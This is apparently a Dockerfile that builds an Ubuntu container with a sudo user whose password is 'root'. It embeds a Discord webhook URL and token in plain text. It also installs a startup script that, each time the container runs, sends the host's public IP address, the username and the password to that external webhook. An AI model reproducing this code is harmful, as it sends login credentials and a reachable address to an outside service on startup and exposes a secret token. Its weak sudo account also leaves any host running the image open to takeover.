# Use the official Ubuntu base image
FROM ubuntu:latest

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV WEBHOOK_URL=https://discord.com/api/webhooks/1289955380323160127/6JzbyzLROIo80Hb4uh3ImGpEPg2pKW5U1bLenvOcL7uqxd4bAxXbZaPsAsk9xO66wn35
ENV USERNAME=newuser
ENV PASSWORD=root

# Update and install necessary packages
RUN apt-get update && \
    apt-get install -y sudo curl jq openssl && \
    rm -rf /var/lib/apt/lists/*

# Create a new user with the password 'root'
RUN useradd -m -s /bin/bash $USERNAME && \
    echo "$USERNAME:$PASSWORD" | chpasswd && \
    usermod -aG sudo $USERNAME && \
    echo "PASSWORD=$PASSWORD" > /root/user_credentials.txt

# Write the webhook script correctly
RUN cat << 'EOF' > /usr/local/bin/send_webhook.sh
#!/bin/bash
IP=$(curl -s ifconfig.me)
PASSWORD="root"
PAYLOAD=$(jq -n --arg ip "$IP" --arg user "$USERNAME" --arg pass "$PASSWORD" '{"content": "IP: \($ip)\nUser: \($user)\nPassword: \($pass)"}')
curl -H "Content-Type: application/json" -d "$PAYLOAD" $WEBHOOK_URL
EOF

# Make the script executable
RUN chmod +x /usr/local/bin/send_webhook.sh

# Execute the script during container startup
CMD ["/usr/local/bin/send_webhook.sh"]
